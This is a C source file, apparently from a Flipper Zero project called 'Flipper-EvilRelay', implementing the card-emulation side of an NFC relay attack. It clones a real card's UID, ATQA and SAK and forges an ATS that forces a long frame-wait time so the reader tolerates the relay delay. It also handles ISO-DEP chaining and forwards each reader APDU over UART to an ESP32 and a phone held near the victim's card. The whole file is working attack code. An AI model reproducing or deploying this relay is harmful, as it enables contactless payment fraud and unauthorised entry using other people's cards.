// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (c) 2026 7h30th3r0n3. Part of Flipper-EvilRelay: https://github.com/7h30th3r0n3/Flipper-EvilRelay
#include "relay_nfc.h"
#include "relay_uart.h"

#include <furi.h>
#include <nfc/nfc.h>
#include <nfc/nfc_listener.h>
#include <nfc/protocols/iso14443_3a/iso14443_3a.h>
#include <nfc/protocols/iso14443_3a/iso14443_3a_listener.h>
#include <bit_buffer.h>

#define TAG "RelayNfc"
#define F_IDENT 1
#define F_REQ 2
#define F_RESP 3

// Time the ISO-DEP listener waits (blocking the NFC thread, inside the callback)
// for the card response relayed back over UART. The forged ATS advertises FWI=14
// (FWT ~4.9 s) so the reader waits that long for each block; stay under it.
#define RELAY_RESP_TIMEOUT_MS 3000

// ISO-DEP PCB bits (ISO 14443-4).
#define PCB_CHAINING 0x10
#define PCB_CID      0x08
#define PCB_NAD      0x04

// ATS T0 presence bits.
#define ATS_T0_TA1 0x10
#define ATS_T0_TB1 0x20

typedef enum {
    ST_IDLE, // before RATS
    ST_ACTIVE, // activated, awaiting a command I-block
    ST_RECV_CMD, // reassembling a reader-chained command
    ST_CHAINING, // sending a chained response, awaiting reader R(ACK)
} RelayState;

static Nfc* g_nfc = NULL;
static NfcListener* g_listener = NULL;
static Iso14443_3aData* g_data = NULL;
static FuriSemaphore* g_resp_sem = NULL;
static BitBuffer* g_txbuf = NULL;

// Forged ATS to answer RATS with (raw bytes, FWI forced to 14 for a long FWT).
static uint8_t g_ats[64];
static uint8_t g_ats_len = 0;
// Reader max frame size (FSD), parsed from the RATS FSDI. Drives outbound chaining.
static int g_reader_fsd = 256;

static uint8_t g_resp[520]; // card response from the phone
static volatile uint16_t g_resp_len = 0;
static uint8_t g_cmd[600]; // reassembled reader command (APDU)
static uint16_t g_cmd_len = 0;

// Outbound response-chaining progress.
static uint16_t g_chain_off = 0;
static uint16_t g_chain_idx = 0;
static uint8_t g_chain_bn = 0;
static int g_chain_cid = -1;

static RelayState g_state = ST_IDLE;
static volatile uint32_t g_apdu = 0;
static volatile bool g_emul = false;
static uint8_t g_seq = 0;
static uint8_t g_last_ident[72];
static uint16_t g_last_ident_len = 0;

bool relay_nfc_emulating(void) {
    return g_emul;
}
uint32_t relay_nfc_apdu_count(void) {
    return g_apdu;
}

// FSDI -> FSD (max frame bytes the reader accepts), ISO 14443-4 table.
static int fsd_from_fsdi(uint8_t fsdi) {
    static const int t[9] = {16, 24, 32, 40, 48, 64, 96, 128, 256};
    return t[fsdi > 8 ? 8 : fsdi];
}

// Send one raw standard frame to the reader (the HAL appends the CRC).
static void raw_tx(Iso14443_3aListener* inst, const uint8_t* buf, uint16_t len) {
    bit_buffer_reset(g_txbuf);
    bit_buffer_copy_bytes(g_txbuf, buf, len);
    iso14443_3a_listener_send_standard_frame(inst, g_txbuf);
}

// Emit the next I-block of the response being sent, chaining if it exceeds the
// reader's frame size. The first block carries the command's block number; each
// chained block toggles it. M=1 while more follow, M=0 on the last. Sets g_state.
static void send_resp_chunk(Iso14443_3aListener* inst) {
    int hdr = 1 + (g_chain_cid >= 0 ? 1 : 0);
    int chunk_max = g_reader_fsd - hdr - 2; // minus PCB(+CID) and CRC
    if(chunk_max < 8) chunk_max = 8;
    if(chunk_max > 250) chunk_max = 250;

    uint16_t remaining = g_resp_len - g_chain_off;
    uint16_t chunk = (remaining > (uint16_t)chunk_max) ? (uint16_t)chunk_max : remaining;
    bool last = (uint16_t)(g_chain_off + chunk) >= g_resp_len;
    uint8_t curbn = (uint8_t)((g_chain_bn ^ (g_chain_idx & 1)) & 1);

    uint8_t f[260];
    uint16_t fi = 0;
    f[fi++] = (uint8_t)(0x02 | curbn | (g_chain_cid >= 0 ? PCB_CID : 0) | (last ? 0 : PCB_CHAINING));
    if(g_chain_cid >= 0) f[fi++] = (uint8_t)g_chain_cid;
    memcpy(f + fi, g_resp + g_chain_off, chunk);
    fi += chunk;
    raw_tx(inst, f, fi);

    g_chain_off += chunk;
    g_chain_idx++;
    g_state = last ? ST_ACTIVE : ST_CHAINING;
}

// Relay the reassembled command to the phone, wait (bounded) for the card
// response, then start sending it back (chained). On timeout, answer 6F00.
static void service_command(Iso14443_3aListener* inst, uint8_t bn, int cid) {
    while(furi_semaphore_acquire(g_resp_sem, 0) == FuriStatusOk) {
    } // drain stale token
    g_resp_len = 0;
    uint32_t t0 = furi_get_tick();
    relay_uart_tx_frame(F_REQ, g_seq++, g_cmd, g_cmd_len);
    bool got = (furi_semaphore_acquire(g_resp_sem, RELAY_RESP_TIMEOUT_MS) == FuriStatusOk);
    uint32_t rtt = furi_get_tick() - t0;

    if(!got || g_resp_len == 0) {
        g_resp[0] = 0x6F; // SW 6F00: generic failure, lets the reader move on cleanly
        g_resp[1] = 0x00;
        g_resp_len = 2;
        FURI_LOG_W(TAG, "no RESP (rtt=%lums) -> 6F00", (unsigned long)rtt);
    } else {
        FURI_LOG_I(
            TAG,
            "apdu cmd=%uB resp=%uB rtt=%lums fsd=%d",
            (unsigned)g_cmd_len,
            (unsigned)g_resp_len,
            (unsigned long)rtt,
            g_reader_fsd);
        g_apdu++;
    }
    g_chain_off = 0;
    g_chain_idx = 0;
    g_chain_bn = bn;
    g_chain_cid = cid;
    send_resp_chunk(inst);
}

// ISO14443-3A listener callback (NFC thread). We implement the ISO-DEP (layer 4)
// state machine ourselves: answer RATS/PPS, relay application APDUs to the phone,
// and CHAIN large responses into several I-blocks (the 4a listener can't).
static NfcCommand relay_nfc_cb(NfcGenericEvent event, void* ctx) {
    UNUSED(ctx);
    if(event.protocol != NfcProtocolIso14443_3a) return NfcCommandContinue;
    Iso14443_3aListener* inst = (Iso14443_3aListener*)event.instance;
    Iso14443_3aListenerEvent* ev = (Iso14443_3aListenerEvent*)event.event_data;

    if(ev->type == Iso14443_3aListenerEventTypeReceivedStandardFrame) {
        const uint8_t* rx = bit_buffer_get_data(ev->data->buffer);
        size_t rxlen = bit_buffer_get_size_bytes(ev->data->buffer);
        if(rxlen < 1) return NfcCommandContinue;
        uint8_t pcb = rx[0];

        if(pcb == 0xE0) { // RATS -> ATS
            uint8_t fsdi = (rxlen >= 2) ? (uint8_t)(rx[1] >> 4) : 8;
            g_reader_fsd = fsd_from_fsdi(fsdi);
            raw_tx(inst, g_ats, g_ats_len);
            g_state = ST_ACTIVE;
            g_cmd_len = 0;
            FURI_LOG_I(TAG, "RATS fsd=%d -> ATS %uB", g_reader_fsd, (unsigned)g_ats_len);
            return NfcCommandContinue;
        }
        if((pcb & 0xF0) == 0xD0) { // PPS request -> echo PPSS
            uint8_t resp = pcb;
            raw_tx(inst, &resp, 1);
            return NfcCommandContinue;
        }
        if(pcb == 0xC2) { // S(DESELECT) -> echo, re-arm for the next tap
            uint8_t d = 0xC2;
            raw_tx(inst, &d, 1);
            g_state = ST_ACTIVE;
            g_cmd_len = 0;
            return NfcCommandContinue;
        }
        if(g_state == ST_CHAINING && (pcb & 0xC0) == 0x80) { // R-block during chaining
            if((pcb & 0x10) == 0) send_resp_chunk(inst); // R(ACK) -> next chunk (ignore NAK)
            return NfcCommandContinue;
        }
        if((pcb & 0xE2) == 0x02) { // I-block
            int off = 1;
            int cid = -1;
            if(pcb & PCB_CID) {
                cid = (rxlen > (size_t)off) ? rx[off] : 0;
                off++;
            }
            if(pcb & PCB_NAD) off++;
            uint8_t bn = pcb & 0x01;
            uint16_t plen = (rxlen > (size_t)off) ? (uint16_t)(rxlen - off) : 0;

            if(g_state != ST_RECV_CMD) g_cmd_len = 0; // first fragment of a command
            if((uint32_t)g_cmd_len + plen <= sizeof(g_cmd)) {
                memcpy(g_cmd + g_cmd_len, rx + off, plen);
                g_cmd_len += plen;
            }
            if(pcb & PCB_CHAINING) { // reader-chained command: ACK and await more
                uint8_t rack = (uint8_t)(0xA2 | bn);
                raw_tx(inst, &rack, 1);
                g_state = ST_RECV_CMD;
                return NfcCommandContinue;
            }
            g_state = ST_ACTIVE; // command complete
            service_command(inst, bn, cid);
            return NfcCommandContinue;
        }
        return NfcCommandContinue; // ignore anything else
    } else if(
        ev->type == Iso14443_3aListenerEventTypeFieldOff ||
        ev->type == Iso14443_3aListenerEventTypeHalted) {
        g_state = ST_IDLE;
        g_cmd_len = 0;
        g_last_ident_len = 0;
    }
    return NfcCommandContinue;
}

// Store the forged ATS (raw bytes), forcing FWI=14 in TB1 so the reader grants a
// long frame-wait time that covers the Wi-Fi/UART round trip.
static void relay_nfc_store_ats(const uint8_t* ats, uint8_t atslen) {
    static const uint8_t defats[5] = {0x05, 0x78, 0x80, 0xE0, 0x00}; // TL,T0,TA1,TB1(FWI14),TC1
    if(atslen < 2 || !ats) {
        memcpy(g_ats, defats, sizeof(defats));
        g_ats_len = sizeof(defats);
        return;
    }
    if(atslen > sizeof(g_ats)) atslen = sizeof(g_ats);
    memcpy(g_ats, ats, atslen);
    g_ats_len = atslen;
    // Force FWI=14 in TB1 (keep SFGI low nibble) for a generous FWT.
    uint8_t t0 = g_ats[1];
    int idx = 2;
    if(t0 & ATS_T0_TA1) idx++;
    if((t0 & ATS_T0_TB1) && idx < g_ats_len) g_ats[idx] = (uint8_t)(0xE0 | (g_ats[idx] & 0x0F));
}

static void relay_nfc_restart_listener(
    const uint8_t* uid,
    uint8_t uidlen,
    const uint8_t* atqa,
    uint8_t sak,
    const uint8_t* ats,
    uint8_t atslen) {
    if(g_listener) {
        nfc_listener_stop(g_listener);
        nfc_listener_free(g_listener);
        g_listener = NULL;
    }
    if(!g_data) g_data = iso14443_3a_alloc();
    iso14443_3a_set_uid(g_data, uid, uidlen);
    iso14443_3a_set_atqa(g_data, atqa);
    iso14443_3a_set_sak(g_data, sak);
    relay_nfc_store_ats(ats, atslen);

    g_state = ST_IDLE;
    g_cmd_len = 0;
    g_listener = nfc_listener_alloc(g_nfc, NfcProtocolIso14443_3a, g_data);
    nfc_listener_start(g_listener, relay_nfc_cb, NULL);
    g_emul = true;
    FURI_LOG_I(TAG, "emulating uid_len=%d sak=%02X ats=%uB", uidlen, sak, (unsigned)g_ats_len);
}

// A relay frame arrived from the ESP32 over UART (worker-thread context).
void relay_nfc_on_frame(uint8_t type, const uint8_t* data, uint16_t len, void* ctx) {
    UNUSED(ctx);
    if(type == F_IDENT) {
        // [uidLen][uid..][atqa0][atqa1][sak][atsLen][ats..]
        if(len < 1) return;
        uint8_t uidlen = data[0];
        if(uidlen > 10 || len < (uint16_t)(1 + uidlen + 3)) return;
        const uint8_t* uid = data + 1;
        const uint8_t* atqa = data + 1 + uidlen;
        uint8_t sak = data[1 + uidlen + 2];
        const uint8_t* ats = NULL;
        uint8_t atslen = 0;
        uint16_t off = 1 + uidlen + 3;
        if(len > off) {
            atslen = data[off];
            if((uint16_t)(off + 1 + atslen) <= len) {
                ats = data + off + 1;
            } else {
                atslen = 0;
            }
        }
        // Dedupe identical IDENTs (the phone re-reads the card between taps):
        // restarting the listener from this worker thread mid-exchange is racy.
        if(g_emul && len == g_last_ident_len && len <= sizeof(g_last_ident) &&
           memcmp(data, g_last_ident, len) == 0) {
            return;
        }
        if(len <= sizeof(g_last_ident)) {
            memcpy(g_last_ident, data, len);
            g_last_ident_len = len;
        } else {
            g_last_ident_len = 0;
        }
        relay_nfc_restart_listener(uid, uidlen, atqa, sak, ats, atslen);
    } else if(type == F_RESP) {
        uint16_t n = len;
        if(n > sizeof(g_resp)) n = sizeof(g_resp);
        memcpy(g_resp, data, n);
        g_resp_len = n;
        furi_semaphore_release(g_resp_sem);
    }
}

void relay_nfc_start(void) {
    g_apdu = 0;
    g_emul = false;
    g_resp_len = 0;
    g_seq = 0;
    g_state = ST_IDLE;
    g_cmd_len = 0;
    g_last_ident_len = 0;
    if(!g_nfc) g_nfc = nfc_alloc();
    if(!g_resp_sem) g_resp_sem = furi_semaphore_alloc(1, 0);
    if(!g_txbuf) g_txbuf = bit_buffer_alloc(272);
}

void relay_nfc_stop(void) {
    g_emul = false;
    g_state = ST_IDLE;
    g_last_ident_len = 0;
    if(g_listener) {
        nfc_listener_stop(g_listener);
        nfc_listener_free(g_listener);
        g_listener = NULL;
    }
    if(g_data) {
        iso14443_3a_free(g_data);
        g_data = NULL;
    }
    if(g_nfc) {
        nfc_free(g_nfc);
        g_nfc = NULL;
    }
    if(g_txbuf) {
        bit_buffer_free(g_txbuf);
        g_txbuf = NULL;
    }
    if(g_resp_sem) {
        furi_semaphore_free(g_resp_sem);
        g_resp_sem = NULL;
    }
}
